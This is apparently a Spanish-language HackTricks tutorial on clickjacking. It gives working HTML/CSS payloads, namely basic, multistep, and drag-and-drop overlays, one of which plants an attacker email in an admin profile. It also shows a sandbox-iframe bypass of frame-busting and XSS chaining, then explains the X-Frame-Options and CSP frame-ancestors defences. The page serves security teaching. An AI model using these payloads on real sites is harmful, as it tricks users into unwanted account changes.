# Clickjacking

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f치cilmente con las herramientas comunitarias **m치s avanzadas**.\
Obt칠n Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 쯈u칠 es Clickjacking?

Clickjacking es un ataque que **enga침a** a un **usuario** para que **haga clic** en un **elemento** de una p치gina web que es **invisible** o est치 disfrazado como otro elemento. Esto puede hacer que los usuarios descarguen malware sin saberlo, visiten p치ginas web maliciosas, proporcionen credenciales o informaci칩n sensible, transfieran dinero o compren productos en l칤nea. (De [aqu칤](https://www.imperva.com/learn/application-security/clickjacking/)).

### Truco de formularios prellenados

A veces es posible **rellenar el valor de los campos de un formulario usando par치metros GET al cargar una p치gina**. Un atacante puede abusar de este comportamiento para llenar un formulario con datos arbitrarios y enviar la carga 칰til de clickjacking para que el usuario presione el bot칩n Enviar.

### Llenar formulario con Arrastrar y Soltar

Si necesitas que el usuario **rellene un formulario** pero no quieres pedirle directamente que escriba informaci칩n espec칤fica (como el correo electr칩nico o una contrase침a espec칤fica que conoces), puedes simplemente pedirle que **Arrastre y Suelte** algo que escribir치 tus datos controlados como en [**este ejemplo**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Carga 칔til B치sica
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Payload Multistep
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Carga 칰til de Arrastrar y Soltar + Clic
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Si has identificado un **ataque XSS que requiere que un usuario haga clic** en alg칰n elemento para **activar** el XSS y la p치gina es **vulnerable al clickjacking**, podr칤as abusar de esto para enga침ar al usuario y hacer que haga clic en el bot칩n/enlace.\
Ejemplo:\
_Encontraste un **self XSS** en algunos detalles privados de la cuenta (detalles que **solo t칰 puedes configurar y leer**). La p치gina con el **formulario** para establecer estos detalles es **vulnerable** al **Clickjacking** y puedes **prellenar** el **formulario** con los par치metros GET._\
\_\_Un atacante podr칤a preparar un ataque de **Clickjacking** a esa p치gina **prellenando** el **formulario** con el **payload de XSS** y **enga침ando** al **usuario** para que **env칤e** el formulario. Entonces, **cuando se env칤a el formulario** y se modifican los valores, el **usuario ejecutar치 el XSS**.

## C칩mo evitar el Clickjacking

### Defensas del lado del cliente

Es posible ejecutar scripts del lado del cliente que realicen algunos o todos los siguientes comportamientos para prevenir el Clickjacking:

* verificar y asegurar que la ventana de la aplicaci칩n actual sea la ventana principal o superior,
* hacer todos los marcos visibles,
* prevenir clics en marcos invisibles,
* interceptar y marcar posibles ataques de clickjacking en un usuario.

#### Bypass

Como los rompedores de marcos son JavaScript, entonces la configuraci칩n de seguridad del navegador puede prevenir su operaci칩n o incluso el navegador podr칤a no soportar JavaScript. Una soluci칩n efectiva del atacante contra los rompedores de marcos es usar el atributo `sandbox` de iframe de **HTML5**. Cuando se establece con los valores `allow-forms` o `allow-scripts` y se omite el valor `allow-top-navigation`, entonces el script rompedor de marcos puede ser neutralizado ya que el iframe no puede verificar si es o no la ventana superior:
```markup
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
Tanto los valores `allow-forms` como `allow-scripts` permiten las acciones especificadas dentro del iframe, pero se deshabilita la navegaci칩n de nivel superior. Esto inhibe los comportamientos de "frame busting" mientras permite la funcionalidad dentro del sitio objetivo.

Dependiendo del tipo de ataque de Clickjacking realizado **tambi칠n puede ser necesario permitir**: `allow-same-origin` y `allow-modals` o [incluso m치s](https://www.w3schools.com/tags/att_iframe_sandbox.asp). Al preparar el ataque, solo verifica la consola del navegador, puede decirte qu칠 otros comportamientos necesitas permitir.

### X-Frame-Options

El **encabezado de respuesta HTTP `X-Frame-Options`** se puede utilizar para indicar si se debe **permitir** o no que un navegador renderice una p치gina en un `<frame>` o `<iframe>`. Los sitios pueden usar esto para evitar ataques de Clickjacking, asegur치ndose de que **su contenido no est칠 incrustado en otros sitios**. Establece el encabezado **`X-Frame-Options`** para todas las respuestas que contengan contenido HTML. Los valores posibles son:

* `X-Frame-Options: deny` que **impide que cualquier dominio enmarque el contenido** _(Valor recomendado)_
* `X-Frame-Options: sameorigin` que solo **permite al sitio actual** enmarcar el contenido.
* `X-Frame-Options: allow-from https://trusted.com` que **permite al 'uri' especificado** enmarcar esta p치gina.
* Verifica las limitaciones a continuaci칩n porque **esto fallar치 si el navegador no lo soporta**.
* Otros navegadores soportan la nueva directiva **CSP frame-ancestors en su lugar**. Algunos soportan ambos.

### Directiva frame-ancestors de la Pol칤tica de Seguridad de Contenido (CSP)

La **protecci칩n recomendada contra clickjacking** es incorporar la directiva **`frame-ancestors`** en la Pol칤tica de Seguridad de Contenido de la aplicaci칩n.\
La directiva **`frame-ancestors 'none'`** tiene un comportamiento similar a la directiva **`deny` de X-Frame-Options** (_Nadie puede enmarcar la p치gina_).\
La directiva **`frame-ancestors 'self'`** es ampliamente equivalente a la directiva **`sameorigin` de X-Frame-Options** (_solo el sitio actual puede enmarcarlo_).\
La directiva **`frame-ancestors trusted.com`** es ampliamente equivalente a la directiva **`allow-from` de X-Frame-Options** (_solo el sitio de confianza puede enmarcarlo_).

La siguiente CSP solo permite enmarcar a frames del mismo dominio:

`Content-Security-Policy: frame-ancestors 'self';`

Consulta la siguiente documentaci칩n para obtener m치s detalles y ejemplos m치s complejos:

* [https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)

### Limitaciones <a href="#limitations" id="limitations"></a>

* **Soporte del navegador:** CSP frame-ancestors no es soportado por todos los principales navegadores a칰n.
* **X-Frame-Options tiene prioridad:** [Secci칩n "Relaci칩n con X-Frame-Options" de la Especificaci칩n CSP](https://w3c.github.io/webappsec/specs/content-security-policy/#frame-ancestors-and-frame-options) dice: "_Si un recurso se entrega con una pol칤tica que incluye una directiva llamada frame-ancestors y cuya disposici칩n es "enforce", entonces el encabezado X-Frame-Options DEBE ser ignorado_", pero Chrome 40 y Firefox 35 ignoran la directiva frame-ancestors y siguen el encabezado X-Frame-Options en su lugar.

## Referencias

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias **m치s avanzadas** del mundo.\
Obt칠n Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
